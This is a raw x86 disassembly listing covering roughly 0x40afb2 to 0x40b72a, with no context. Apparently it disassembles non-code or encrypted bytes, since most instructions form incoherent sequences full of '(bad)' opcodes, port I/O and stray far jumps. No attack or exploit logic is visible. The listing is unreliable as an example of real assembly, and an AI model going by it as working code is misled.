  40afb2:	sbb    DWORD PTR [ecx-0x7a2d149a],esp
  40afb8:	js     0x40b032
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	push   edi
  40afbf:	sbb    BYTE PTR [esi+0x2b22e366],0x28
  40afc6:	(bad)  
  40afc7:	repz jb 0x40afe2
  40afca:	mov    eax,ds:0x50d6e87c
  40afcf:	imul   edx,ebx,0xa
  40afd2:	add    esp,DWORD PTR [edi+0x75]
  40afd5:	adc    edi,DWORD PTR [edx-0x73]
  40afd8:	and    BYTE PTR [esi],0xd4
  40afdb:	adc    DWORD PTR [ecx],0xdcbd8b0b
  40afe1:	out    0xe3,al
  40afe3:	cmp    ah,BYTE PTR ds:0xa751a4af
  40afe9:	cmp    esp,ecx
  40afeb:	cli    
  40afec:	sub    BYTE PTR [esi+0x1e],0xdd
  40aff0:	adc    DWORD PTR [esi],esp
  40aff2:	sub    edi,ebx
  40aff4:	lahf   
  40aff5:	mov    BYTE PTR [edi-0x45],dl
  40aff8:	(bad)  
  40aff9:	(bad)  
  40affa:	xor    ebx,DWORD PTR [edi-0x289f89f9]
  40b000:	out    dx,eax
  40b001:	xor    edi,eax
  40b003:	mov    es,WORD PTR ds:0x82332fe4
  40b009:	and    ecx,DWORD PTR ds:0x3087f942
  40b00f:	jl     0x40b02c
  40b011:	(bad)  
  40b012:	fwait
  40b013:	jno    0x40afbc
  40b015:	adc    ebp,esp
  40b017:	les    ebx,FWORD PTR [edi]
  40b019:	rol    BYTE PTR [eax-0x5d],0x1c
  40b01d:	ins    BYTE PTR es:[edi],dx
  40b01e:	fimul  WORD PTR [esp+eax*1]
  40b021:	jg     0x40affc
  40b023:	mov    cl,0xdc
  40b025:	neg    ecx
  40b027:	stos   DWORD PTR es:[edi],eax
  40b028:	sahf   
  40b029:	dec    esp
  40b02a:	(bad)  
  40b02b:	out    dx,al
  40b02c:	add    BYTE PTR [ebx+edi*1],0x3a
  40b030:	or     al,0xd4
  40b032:	outs   dx,DWORD PTR ds:[esi]
  40b033:	pusha  
  40b034:	push   ebp
  40b035:	call   0x7e6af650
  40b03a:	xchg   esp,eax
  40b03b:	fidivr WORD PTR [esi]
  40b03d:	rcl    DWORD PTR [eax],cl
  40b03f:	jae    0x40b04e
  40b041:	icebp  
  40b042:	jnp    0x40b0b9
  40b044:	xchg   esp,eax
  40b045:	aad    0x9c
  40b047:	je     0x40afd5
  40b049:	or     ebp,DWORD PTR [edi]
  40b04b:	sub    cl,dl
  40b04d:	outs   dx,DWORD PTR ds:[esi]
  40b04e:	dec    esp
  40b04f:	call   0xa75091d4
  40b054:	in     al,0xe4
  40b056:	inc    esp
  40b057:	sub    al,0x6d
  40b059:	adc    cl,bl
  40b05b:	mov    ds:0x1baef77d,al
  40b060:	xchg   BYTE PTR [esi-0x61],bh
  40b063:	xchg   BYTE PTR [ecx],al
  40b065:	in     al,0x6b
  40b067:	mov    ecx,0x9ac2122e
  40b06c:	xor    dh,ch
  40b06e:	sbb    BYTE PTR [ebx],bh
  40b070:	dec    edi
  40b071:	pushf  
  40b072:	cmp    BYTE PTR [ebx],dh
  40b074:	push   esi
  40b075:	push   esi
  40b076:	add    edx,DWORD PTR [eax+0x18]
  40b079:	xor    DWORD PTR [ebx+eax*4+0x30],ebx
  40b07d:	jno    0x40b02e
  40b07f:	aas    
  40b080:	sub    cl,BYTE PTR [edi+ecx*1]
  40b083:	or     al,0x92
  40b085:	jbe    0x40b100
  40b087:	sub    dh,bl
  40b089:	sub    DWORD PTR [eax+0x701d9c2],0x22
  40b090:	mov    ch,0x87
  40b092:	xchg   edi,eax
  40b093:	lods   eax,DWORD PTR ds:[esi]
  40b094:	aaa    
  40b095:	inc    eax
  40b096:	in     eax,dx
  40b097:	or     DWORD PTR [eax+0x8222fda],ecx
  40b09d:	mov    edi,0x26bc9dcf
  40b0a2:	stos   BYTE PTR es:[edi],al
  40b0a3:	add    ebp,esi
  40b0a5:	push   esp
  40b0a6:	pop    ss
  40b0a7:	mov    esp,?
  40b0a9:	pushf  
  40b0aa:	loope  0x40b10b
  40b0ac:	div    BYTE PTR ds:0x15f23da9
  40b0b2:	cmp    edi,ebp
  40b0b4:	not    DWORD PTR [ebp+0x722678bf]
  40b0ba:	xlat   BYTE PTR ds:[ebx]
  40b0bb:	mov    bl,0xe5
  40b0bd:	jge    0x40b0b0
  40b0bf:	(bad)  
  40b0c0:	cdq    
  40b0c1:	fbld   TBYTE PTR [ebx]
  40b0c3:	sub    bl,BYTE PTR [edi]
  40b0c5:	rol    DWORD PTR [ebp-0xb],0x72
  40b0c9:	in     ax,0xbc
  40b0cc:	mov    esi,0xbcb7c70f
  40b0d1:	mov    DWORD PTR [esi-0x32b1ecbd],0x9a17f071
  40b0db:	jb     0x40b116
  40b0dd:	inc    esi
  40b0de:	addr16 dec edi
  40b0e0:	arpl   ax,bp
  40b0e2:	cs dec eax
  40b0e4:	lahf   
  40b0e5:	inc    eax
  40b0e6:	push   esp
  40b0e7:	mov    al,ds:0x9bebed85
  40b0ec:	jmp    0x40b137
  40b0ee:	lahf   
  40b0ef:	faddp  st(7),st
  40b0f1:	mov    cl,0x7d
  40b0f3:	popf   
  40b0f4:	sbb    al,0x30
  40b0f6:	dec    sp
  40b0f8:	fld    QWORD PTR [edx+0x6629a7da]
  40b0fe:	jmp    0x7b27:0x977f6a52
  40b105:	mov    DWORD PTR ds:0x8d1c5466,ebx
  40b10b:	lock pusha 
  40b10d:	outs   dx,DWORD PTR ds:[esi]
  40b10e:	sbb    bl,BYTE PTR [ecx]
  40b110:	add    eax,0x7f2dd8e3
  40b115:	leave  
  40b116:	mov    cl,0xc8
  40b118:	and    dh,BYTE PTR [edi+0x42a3e879]
  40b11e:	cli    
  40b11f:	les    eax,FWORD PTR ds:0x4b9d93e8
  40b125:	jle    0x40b0d8
  40b127:	in     eax,dx
  40b128:	add    ch,BYTE PTR [edi+0x45]
  40b12b:	ja     0x40b0c0
  40b12d:	push   es
  40b12e:	xchg   ebp,eax
  40b12f:	or     al,0x15
  40b131:	mov    DWORD PTR [edx],edx
  40b133:	inc    esp
  40b134:	and    BYTE PTR [edi],ch
  40b136:	fmul   DWORD PTR [eax+0x3cae3230]
  40b13c:	arpl   WORD PTR [ecx-0x78a05239],sp
  40b142:	inc    edi
  40b143:	cmp    bl,ah
  40b145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b146:	aad    0x9b
  40b148:	push   eax
  40b149:	je     0x40b10f
  40b14b:	mov    edi,DWORD PTR ds:0xceb5ce96
  40b151:	clc    
  40b152:	inc    ebp
  40b153:	cmp    eax,0xcffcd4f4
  40b158:	add    DWORD PTR [ebx+0x4e7fa597],0x7b
  40b15f:	stos   DWORD PTR es:[edi],eax
  40b160:	dec    ecx
  40b161:	jg     0x40b114
  40b163:	test   BYTE PTR [edi-0x3d],ch
  40b166:	pusha  
  40b167:	inc    ebp
  40b168:	dec    ebx
  40b169:	sar    DWORD PTR [ebx-0x4d],cl
  40b16c:	lahf   
  40b16d:	jg     0x40b16e
  40b16f:	cs int3 
  40b171:	xor    bh,cl
  40b173:	jp     0x40b0fa
  40b175:	sub    esi,DWORD PTR [esi-0x3f]
  40b178:	sbb    cl,BYTE PTR [ebx-0x1c8baffe]
  40b17e:	xor    esi,DWORD PTR [ecx]
  40b180:	mov    ah,BYTE PTR [ebx+0x30]
  40b183:	cmp    dh,BYTE PTR [ebx]
  40b185:	mov    ebp,0x3af9b4fb
  40b18a:	ds das 
  40b18c:	inc    ecx
  40b18d:	jmp    DWORD PTR [ebx]
  40b190:	fnsave [ebx]
  40b192:	push   ebx
  40b193:	imul   ebp,esp,0x0
  40b196:	pop    esi
  40b197:	sbb    BYTE PTR [ebx+ebp*8+0x1b56a34f],dl
  40b19e:	inc    ecx
  40b19f:	stc    
  40b1a0:	out    dx,al
  40b1a1:	rol    DWORD PTR [esi],cl
  40b1a3:	adc    cl,BYTE PTR [ecx*4+0x4dbac30b]
  40b1aa:	ds in  eax,dx
  40b1ac:	mov    ebx,DWORD PTR [ebx+0x27]
  40b1af:	push   esi
  40b1b0:	test   eax,0x62d4bdfd
  40b1b5:	inc    ebp
  40b1b6:	sbb    DWORD PTR [edi-0x33a85986],esp
  40b1bc:	dec    edi
  40b1bd:	hlt    
  40b1be:	push   esp
  40b1bf:	or     bl,bl
  40b1c1:	adc    DWORD PTR [ebx],ecx
  40b1c3:	dec    ecx
  40b1c4:	adc    DWORD PTR [eax+0x20407f02],edi
  40b1ca:	js     0x40b166
  40b1cc:	or     BYTE PTR [ecx-0x287fed2e],dl
  40b1d2:	neg    DWORD PTR [edx+eiz*1]
  40b1d5:	mov    ebx,0xe6460a09
  40b1da:	cmp    DWORD PTR [edx],0xf72a2c5c
  40b1e0:	stos   DWORD PTR es:[edi],eax
  40b1e1:	dec    esi
  40b1e2:	addr16 test eax,0xb334f01e
  40b1e8:	outs   dx,BYTE PTR ds:[esi]
  40b1e9:	jae    0x40b1fb
  40b1eb:	dec    ecx
  40b1ec:	mov    WORD PTR [eax+0xc],ds
  40b1ef:	popa   
  40b1f0:	ret    
  40b1f1:	ins    BYTE PTR es:[edi],dx
  40b1f2:	mov    DWORD PTR [ebp+0x298b50e6],esi
  40b1f8:	scas   al,BYTE PTR es:[edi]
  40b1f9:	aas    
  40b1fa:	jae    0x40b1ed
  40b1fc:	mov    esp,DWORD PTR [esi-0x6cbd142]
  40b202:	cdq    
  40b203:	sbb    BYTE PTR [ebx+0x67],ch
  40b206:	call   0xe6ee6f3
  40b20b:	mov    ebx,0x6f5d2ea7
  40b210:	(bad)  
  40b211:	xchg   edi,eax
  40b212:	or     ebx,DWORD PTR [esi]
  40b214:	sub    DWORD PTR [ebp+0x48],ebp
  40b217:	shl    DWORD PTR [edx+ebp*2+0x178cec02],cl
  40b21e:	sbb    BYTE PTR [ebx+0x77],ah
  40b221:	ret    0x3712
  40b224:	xor    DWORD PTR [eax+edx*8-0x392d18a5],eax
  40b22b:	outs   dx,BYTE PTR ds:[esi]
  40b22c:	retf   
  40b22d:	jl     0x40b214
  40b22f:	loop   0x40b1d0
  40b231:	(bad)  
  40b232:	fwait
  40b233:	add    DWORD PTR [edx-0xe],ebp
  40b236:	loopne 0x40b20d
  40b238:	dec    esp
  40b239:	stos   DWORD PTR es:[edi],eax
  40b23a:	pop    es
  40b23b:	jg     0x40b212
  40b23d:	pop    ds
  40b23e:	jne    0x40b1ff
  40b240:	mov    ds:0x9287e8f7,eax
  40b245:	out    dx,eax
  40b246:	sahf   
  40b247:	addps  xmm4,xmm7
  40b24a:	mov    al,0xcc
  40b24c:	lods   eax,DWORD PTR ds:[esi]
  40b24d:	dec    ecx
  40b24e:	push   edx
  40b24f:	cmp    BYTE PTR [edi+0x4b9a13d],bl
  40b255:	inc    ebp
  40b256:	lods   al,BYTE PTR ds:[esi]
  40b257:	and    dl,BYTE PTR [ebx]
  40b259:	fs push edx
  40b25b:	mov    ecx,0xed568bdd
  40b260:	jmp    0x40b2a7
  40b262:	jmp    0x61db:0xdd77cc33
  40b269:	lds    edi,FWORD PTR [edx]
  40b26b:	arpl   WORD PTR [esp+eax*4-0x76],di
  40b26f:	call   0x3443:0x7313b9a
  40b276:	add    al,BYTE PTR [ebx+0x14891ed6]
  40b27c:	dec    edi
  40b27d:	fidivr WORD PTR [ebp+0x40]
  40b280:	icebp  
  40b281:	ret    0x3599
  40b284:	bound  eax,QWORD PTR [ebp-0x55edec29]
  40b28a:	xchg   ebp,eax
  40b28b:	test   DWORD PTR ds:0xb4518cff,eax
  40b291:	jmp    0xf259:0x9e542c9e
  40b298:	test   DWORD PTR [edi+0x2b],0xa48738e3
  40b29f:	xor    ebx,DWORD PTR [esi-0x79]
  40b2a2:	xchg   DWORD PTR [edi],ebp
  40b2a4:	sub    DWORD PTR [edi+edx*4],eax
  40b2a7:	or     ch,bl
  40b2a9:	iret   
  40b2aa:	and    esi,DWORD PTR [esi-0x50]
  40b2ad:	test   al,0xeb
  40b2af:	and    BYTE PTR [ecx+0x7a],0x57
  40b2b3:	jmp    0x5f20ee47
  40b2b8:	add    ebp,DWORD PTR [ecx+0x3d]
  40b2bb:	jbe    0x40b337
  40b2bd:	xchg   edx,eax
  40b2be:	sub    cl,0x14
  40b2c1:	add    eax,DWORD PTR [eax]
  40b2c3:	add    dl,dl
  40b2c5:	rol    ah,0xc9
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x245bb132
  40b2d2:	retf   
  40b2d3:	leave  
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	mov    ah,0xec
  40b2de:	cmp    DWORD PTR [edi+0x2b532f3b],ebx
  40b2e4:	jns    0x40b27e
  40b2e6:	and    eax,0xce1e2259
  40b2eb:	mov    eax,esi
  40b2ed:	pop    esp
  40b2ee:	pop    ds
  40b2ef:	std    
  40b2f0:	repz xchg edi,eax
  40b2f2:	imul   DWORD PTR ds:0x874a81d4
  40b2f8:	ss addr16 xchg ebx,eax
  40b2fb:	mov    edx,0x35cef68c
  40b300:	sbb    BYTE PTR ss:[edx-0x6d1321f8],bh
  40b307:	inc    ebp
  40b308:	retf   
  40b309:	enter  0xd594,0xb4
  40b30d:	loope  0x40b326
  40b30f:	mov    esp,0xb75f4132
  40b314:	mov    ah,0xe
  40b316:	or     eax,0xf76afef3
  40b31b:	cmp    bl,BYTE PTR [esi]
  40b31d:	cmp    al,0x9a
  40b31f:	cmp    BYTE PTR [ecx+eiz*2-0x7776a1f2],bh
  40b326:	stos   DWORD PTR es:[edi],eax
  40b327:	jg     0x40b2af
  40b329:	adc    ebp,edx
  40b32b:	inc    eax
  40b32c:	jle    0x40b33d
  40b32e:	loope  0x40b2fe
  40b330:	and    eax,0x12fd669f
  40b335:	jno    0x40b364
  40b337:	into   
  40b338:	cmp    eax,0xb2e839ee
  40b33d:	pop    eax
  40b33e:	cmp    edi,edx
  40b340:	mov    bh,0x6b
  40b342:	test   eax,0x791cd56d
  40b347:	cmp    ecx,DWORD PTR [eax-0x1c1f9718]
  40b34d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b34f:	mov    esp,0xf786e62f
  40b354:	loope  0x40b306
  40b356:	outs   dx,BYTE PTR ds:[esi]
  40b357:	cs pop ebp
  40b359:	dec    eax
  40b35a:	shl    ah,cl
  40b35c:	push   esp
  40b35d:	leave  
  40b35e:	adc    bl,ah
  40b360:	int    0xa6
  40b362:	jns    0x40b382
  40b364:	clc    
  40b365:	mov    ?,WORD PTR [edi]
  40b367:	push   ds
  40b368:	jmp    0x5ff1eca8
  40b36d:	mov    WORD PTR [ebp-0x8d42b3d],es
  40b373:	xor    eax,0x52549f21
  40b378:	mov    ds:0x1a0a58aa,al
  40b37d:	and    esi,DWORD PTR [edx+0x4c]
  40b380:	jmp    0x5346b95c
  40b385:	jmp    0x2d792d7
  40b38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b38b:	outs   dx,BYTE PTR ds:[esi]
  40b38c:	js     0x40b398
  40b38e:	pop    ss
  40b38f:	push   eax
  40b390:	add    DWORD PTR [edx+0x3579307c],0x1276053f
  40b39a:	push   ebp
  40b39b:	cli    
  40b39c:	dec    edx
  40b39d:	lds    esp,FWORD PTR [ecx]
  40b39f:	pusha  
  40b3a0:	and    ah,BYTE PTR [ebx]
  40b3a2:	call   FWORD PTR [ebp+0x77b8916]
  40b3a8:	mov    edi,0x42fbb548
  40b3ad:	xchg   ebx,eax
  40b3ae:	pop    ebp
  40b3af:	dec    ecx
  40b3b0:	addr16 and eax,0x108dc67d
  40b3b6:	push   eax
  40b3b7:	dec    ecx
  40b3b8:	adc    eax,DWORD PTR [edx]
  40b3ba:	push   ebx
  40b3bb:	sti    
  40b3bc:	ror    ah,cl
  40b3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3bf:	cmp    eax,0x5795891d
  40b3c4:	popf   
  40b3c5:	mov    dh,0xc8
  40b3c7:	dec    ebp
  40b3c8:	xor    ch,BYTE PTR [esi+0x66e21a21]
  40b3ce:	pushf  
  40b3cf:	jle    0x40b435
  40b3d1:	push   ss
  40b3d2:	xchg   ah,al
  40b3d4:	adc    BYTE PTR [ebx+edx*1-0x49d2cb35],0x4
  40b3dc:	lds    edi,FWORD PTR [eax-0x5655efd1]
  40b3e2:	(bad)  
  40b3e4:	leave  
  40b3e5:	xchg   DWORD PTR [edi],eax
  40b3e7:	fst    DWORD PTR [ecx]
  40b3e9:	js     0x40b388
  40b3eb:	cmp    ecx,DWORD PTR [esi]
  40b3ed:	ror    edi,cl
  40b3ef:	push   es
  40b3f0:	sub    DWORD PTR [edi+eiz*4+0x62062e29],ebx
  40b3f7:	mov    cl,0x93
  40b3f9:	mov    BYTE PTR ss:0x65d1b497,dl
  40b400:	in     eax,dx
  40b401:	xchg   esi,eax
  40b402:	mov    dl,0x1e
  40b404:	or     DWORD PTR [edx],ecx
  40b406:	int    0x37
  40b408:	push   ebp
  40b409:	ret    0x8f70
  40b40c:	in     eax,dx
  40b40d:	pop    ecx
  40b40e:	mov    cl,0xa3
  40b410:	push   esp
  40b411:	lods   eax,DWORD PTR ds:[esi]
  40b412:	or     eax,0xcf2bb719
  40b417:	mov    dh,0xf7
  40b419:	xchg   esi,eax
  40b41a:	jae    0x40b3d4
  40b41c:	and    dh,BYTE PTR [edi+0x6f6bd3f9]
  40b422:	lahf   
  40b423:	xor    BYTE PTR [ecx],ah
  40b425:	pop    esi
  40b426:	dec    esp
  40b427:	cld    
  40b428:	adc    ah,dl
  40b42a:	adc    eax,0x81106555
  40b42f:	add    edi,ecx
  40b431:	jno    0x40b441
  40b433:	add    esp,DWORD PTR [ebp+0x4a]
  40b436:	sar    BYTE PTR [eax+0x12d44594],1
  40b43c:	stos   DWORD PTR es:[edi],eax
  40b43d:	mov    eax,ebx
  40b43f:	mov    cl,0x27
  40b441:	pushf  
  40b442:	je     0x40b442
  40b444:	test   BYTE PTR [edi-0x6],dl
  40b447:	adc    bl,BYTE PTR [esi+0x2106802e]
  40b44d:	cld    
  40b44e:	inc    edx
  40b44f:	push   0x1e06ab9a
  40b454:	sti    
  40b455:	dec    esp
  40b456:	mov    ebx,0xa2e16ae5
  40b45b:	lock xor DWORD PTR [ecx-0x49],0x45075ca0
  40b463:	push   esi
  40b464:	inc    ecx
  40b466:	push   ebp
  40b467:	pop    edi
  40b468:	and    esp,DWORD PTR [eax-0x6e7f1287]
  40b46e:	push   DWORD PTR [eax]
  40b470:	sbb    dl,BYTE PTR [ebp+0x33]
  40b473:	ins    BYTE PTR es:[edi],dx
  40b474:	and    DWORD PTR [ebx-0x4e4c9bab],0xeab6b9d7
  40b47e:	mov    esi,DWORD PTR ss:[edx-0x4ef820b0]
  40b485:	add    al,0xe7
  40b487:	xor    edx,DWORD PTR [eax]
  40b489:	mov    ebx,0x8ed174d
  40b48e:	push   ss
  40b48f:	neg    edi
  40b491:	sbb    eax,0xf74a948a
  40b496:	add    BYTE PTR [edi+0x72],bh
  40b499:	sub    edx,ecx
  40b49b:	aas    
  40b49c:	je     0x40b4da
  40b49e:	test   bl,0x2b
  40b4a1:	popa   
  40b4a2:	jmp    DWORD PTR [ecx+eax*8-0x78f70970]
  40b4a9:	xor    dl,BYTE PTR [ebp+edx*8+0x25e288d7]
  40b4b0:	les    edx,FWORD PTR [ecx-0x5a2d9926]
  40b4b6:	es (bad) 
  40b4b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4b9:	sub    DWORD PTR [edi],eax
  40b4bb:	mov    bl,ch
  40b4bd:	loopne 0x40b4b4
  40b4bf:	cmp    BYTE PTR [ebx],cl
  40b4c1:	neg    BYTE PTR [ebx-0x54]
  40b4c4:	imul   edi,DWORD PTR [edi-0x2abd8201],0x66
  40b4cb:	and    eax,0xfcf6758e
  40b4d0:	imul   ecx,ebp,0xffffffc4
  40b4d3:	mov    dh,BYTE PTR [esi]
  40b4d5:	push   esi
  40b4d6:	jg     0x40b4e6
  40b4d8:	add    ecx,DWORD PTR [ebx-0x7fef45a4]
  40b4de:	xor    al,0x75
  40b4e0:	scas   al,BYTE PTR es:[edi]
  40b4e1:	loope  0x40b4e1
  40b4e3:	mov    dh,0xdf
  40b4e5:	xor    BYTE PTR [edi],0x69
  40b4e8:	mov    ebp,0xab00e2a4
  40b4ed:	mov    bh,0xa1
  40b4ef:	mov    edi,0xac1e9b88
  40b4f4:	push   0x7e7f65d5
  40b4f9:	sbb    esp,DWORD PTR [eax]
  40b4fb:	add    bl,BYTE PTR [ecx+0x535839ce]
  40b501:	mov    eax,ds:0x9e9f699
  40b506:	jb     0x40b530
  40b508:	mov    ds:0x1858a1f4,eax
  40b50d:	aam    0xda
  40b50f:	jne    0x40b588
  40b511:	fdivr  st(5),st
  40b513:	popf   
  40b514:	lods   eax,DWORD PTR ds:[esi]
  40b515:	ret    0x6a3e
  40b518:	rcr    edi,0x50
  40b51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b51c:	shr    cl,1
  40b51e:	test   DWORD PTR [ebp-0x2c],edi
  40b521:	or     edx,DWORD PTR [eax+0x38ce24b4]
  40b527:	fsubp  st(2),st
  40b529:	pop    edi
  40b52a:	mov    eax,0x84953b8
  40b52f:	pop    eax
  40b530:	xlat   BYTE PTR ds:[ebx]
  40b531:	(bad)  
  40b532:	out    dx,eax
  40b533:	imul   esi,esp,0xef6ea69e
  40b539:	or     bl,BYTE PTR [ecx]
  40b53b:	sub    al,0xa7
  40b53d:	dec    edi
  40b53e:	pop    es
  40b53f:	or     eax,0x1d9210df
  40b544:	leave  
  40b545:	pop    ebx
  40b546:	repnz inc esp
  40b548:	xchg   ebp,eax
  40b549:	cld    
  40b54a:	aam    0x27
  40b54c:	(bad)  [eax]
  40b54e:	add    ch,0x89
  40b551:	out    dx,al
  40b552:	lods   al,BYTE PTR ds:[esi]
  40b553:	mov    al,0x98
  40b555:	stos   DWORD PTR es:[edi],eax
  40b556:	mov    cl,0xc7
  40b558:	cs ins DWORD PTR es:[edi],dx
  40b55a:	mov    es,ecx
  40b55c:	popa   
  40b55d:	pop    es
  40b55e:	mov    ds:0xd11d26d1,eax
  40b563:	push   0x3
  40b565:	out    0x8b,eax
  40b567:	or     DWORD PTR [eax-0x3a],0xffffff91
  40b56b:	pop    esp
  40b56d:	dec    ecx
  40b56e:	jne    0x40b5db
  40b570:	adc    ebp,esi
  40b572:	aas    
  40b573:	aam    0xfd
  40b575:	mov    edx,0xce15831c
  40b57a:	and    dh,cl
  40b57c:	(bad)
  40b581:	(bad)  [esi]
  40b583:	or     DWORD PTR [eax],ebx
  40b585:	push   es
  40b586:	and    esi,DWORD PTR [ebp-0x26d90088]
  40b58c:	cmp    al,0x73
  40b58e:	call   0xd1868586
  40b593:	or     bh,cl
  40b595:	js     0x40b5fa
  40b597:	pop    es
  40b598:	xor    al,0x1d
  40b59a:	(bad)  
  40b59b:	jl     0x40b5f8
  40b59d:	scas   eax,DWORD PTR es:[edi]
  40b59e:	mov    ebp,0x7d502df
  40b5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a4:	dec    edx
  40b5a5:	sbb    edi,DWORD PTR [ebx+0x46]
  40b5a8:	mov    ?,WORD PTR [ebx+ecx*1]
  40b5ab:	jg     0x40b554
  40b5ad:	lock push cs
  40b5af:	popf   
  40b5b0:	sbb    BYTE PTR [ebp+0x7],bh
  40b5b3:	dec    esp
  40b5b4:	xchg   edx,eax
  40b5b5:	(bad)  
  40b5b6:	cmc    
  40b5b7:	nop
  40b5b8:	icebp  
  40b5b9:	(bad)  
  40b5ba:	out    dx,al
  40b5bb:	pushf  
  40b5bc:	inc    edi
  40b5bd:	aad    0x87
  40b5bf:	jns    0x40b562
  40b5c1:	ret    0x92c3
  40b5c4:	pop    ds
  40b5c5:	ret    0x6f2b
  40b5c8:	or     ch,BYTE PTR [esi+0x3fafe339]
  40b5ce:	push   DWORD PTR [edx+0x1dc1c089]
  40b5d4:	xchg   esi,eax
  40b5d5:	inc    edx
  40b5d6:	imul   esp,ebx,0xf
  40b5d9:	test   BYTE PTR [edi],dl
  40b5db:	add    BYTE PTR [eax],al
  40b5dd:	add    BYTE PTR [ebx+0x881e445],cl
  40b5e3:	popf   
  40b5e4:	sbb    al,0x75
  40b5e6:	pusha  
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x56332a7c]
  40b60d:	sbb    al,0x1c
  40b60f:	mov    esi,0x78788fca
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	mov    ds:0xa70ee412,eax
  40b61d:	inc    edx
  40b61e:	je     0x40b5a8
  40b620:	inc    edi
  40b621:	loop   0x40b5e2
  40b623:	jp     0x40b664
  40b625:	mov    dh,0x8b
  40b627:	inc    eax
  40b628:	add    eax,0x3eb9d242
  40b62d:	push   0x7d09b5b0
  40b632:	xlat   BYTE PTR ds:[ebx]
  40b633:	(bad)  
  40b634:	push   esp
  40b635:	ja     0x40b5e0
  40b637:	icebp  
  40b638:	test   eax,0x52544094
  40b63d:	neg    BYTE PTR [edi+eiz*8]
  40b640:	xchg   ecx,eax
  40b641:	clc    
  40b642:	std    
  40b643:	mov    ah,0xf
  40b645:	loope  0x40b6bd
  40b647:	fcom   QWORD PTR [ebx]
  40b649:	jb     0x40b699
  40b64b:	push   edx
  40b64c:	dec    ebp
  40b64d:	stos   BYTE PTR es:[edi],al
  40b64e:	mov    eax,ds:0x6b9c66f3
  40b653:	repz popa 
  40b655:	lahf   
  40b656:	xchg   ecx,eax
  40b657:	das    
  40b658:	fidiv  DWORD PTR [esi-0x68]
  40b65b:	icebp  
  40b65c:	jmp    0xe627cda8
  40b661:	(bad)  
  40b662:	mov    al,0x29
  40b664:	(bad)  
  40b665:	loope  0x40b67f
  40b667:	dec    ecx
  40b668:	inc    esi
  40b669:	(bad)
  40b66d:	jb     0x40b615
  40b66f:	hlt    
  40b670:	adc    al,0x67
  40b672:	push   esi
  40b673:	sbb    eax,0x5bdec163
  40b678:	(bad)  
  40b679:	mov    cl,0x76
  40b67b:	ins    DWORD PTR es:[edi],dx
  40b67c:	sbb    eax,0xfa0e47a7
  40b681:	mov    WORD PTR [eax],ss
  40b683:	call   DWORD PTR [ecx+0x2628e37c]
  40b689:	adc    ebx,0x79
  40b68c:	(bad)  
  40b68d:	mov    ebx,0xf03eb0c5
  40b692:	adc    BYTE PTR [ecx+0x49bc955e],al
  40b698:	jmp    0xdae0461d
  40b69d:	loope  0x40b691
  40b69f:	(bad)  
  40b6a1:	out    dx,eax
  40b6a2:	xchg   DWORD PTR [ebp-0x6c3a85ae],eax
  40b6a8:	stos   BYTE PTR es:[edi],al
  40b6a9:	ins    BYTE PTR es:[edi],dx
  40b6aa:	test   bh,0x8a
  40b6ad:	or     al,BYTE PTR [edx+0x3bb036b]
  40b6b3:	mov    dh,0x4e
  40b6b5:	mov    esp,0x3ad3fe4d
  40b6ba:	out    0x50,al
  40b6bc:	mov    eax,ds:0x6c8be174
  40b6c1:	dec    esp
  40b6c2:	cwde   
  40b6c3:	jecxz  0x40b6e0
  40b6c5:	pushw  0x63
  40b6c8:	dec    BYTE PTR [ebp-0xb]
  40b6cb:	jb     0x40b74b
  40b6cd:	sbb    ebp,DWORD PTR [eax]
  40b6cf:	jle    0x40b6d6
  40b6d1:	loope  0x40b692
  40b6d3:	test   al,0xd4
  40b6d5:	mov    bl,0xd9
  40b6d7:	mov    edi,cr2
  40b6da:	div    DWORD PTR [edx]
  40b6dc:	add    BYTE PTR [eax-0x3a87049c],0xe7
  40b6e3:	dec    esi
  40b6e4:	ret    
  40b6e5:	aaa    
  40b6e6:	xor    dh,BYTE PTR [edx+eax*8-0x1e]
  40b6ea:	xor    al,0x0
  40b6ec:	sbb    ah,BYTE PTR [edi-0x5b]
  40b6ef:	mov    ds:0x5a480156,al
  40b6f4:	jge    0x40b6fe
  40b6f6:	cdq    
  40b6f7:	lods   eax,DWORD PTR ds:[esi]
  40b6f8:	pop    ebx
  40b6f9:	ret    
  40b6fa:	imul   esp,DWORD PTR [edx],0xffffffad
  40b6fd:	je     0x40b734
  40b6ff:	push   ds
  40b700:	sub    al,0xfd
  40b702:	fwait
  40b703:	rcr    edx,0x59
  40b706:	jmp    0x8fd3:0x60c4b9c0
  40b70d:	inc    eax
  40b70e:	fisttp DWORD PTR [ecx]
  40b710:	push   edi
  40b711:	pusha  
  40b712:	adc    edx,DWORD PTR [edi+ebp*1]
  40b715:	les    esp,FWORD PTR [ecx+0x5b]
  40b718:	cmp    bh,BYTE PTR [edx+0x3c]
  40b71b:	xchg   edi,eax
  40b71c:	push   0xffffffe0
  40b71e:	add    DWORD PTR [eax+0x66],edx
  40b721:	push   esp
  40b722:	mov    al,0x9b
  40b724:	pop    ds
  40b725:	je     0x40b6b0
  40b727:	push   esp
  40b728:	jnp    0x40b6ab
  40b72a:	push   ss
